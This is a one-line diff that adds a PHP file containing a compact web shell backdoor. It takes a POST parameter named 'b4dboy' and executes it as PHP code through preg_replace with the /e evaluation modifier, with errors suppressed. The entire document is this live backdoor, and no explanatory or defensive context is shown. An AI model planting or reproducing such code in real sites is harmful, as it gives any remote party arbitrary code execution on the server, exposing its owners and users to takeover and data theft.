@@ -1,0 +1,1 @@
+<?php ($b4dboy = $_POST['b4dboy']) &&@preg_replace('/ad/e','@'."($b4dboy)", 'add'); ?>
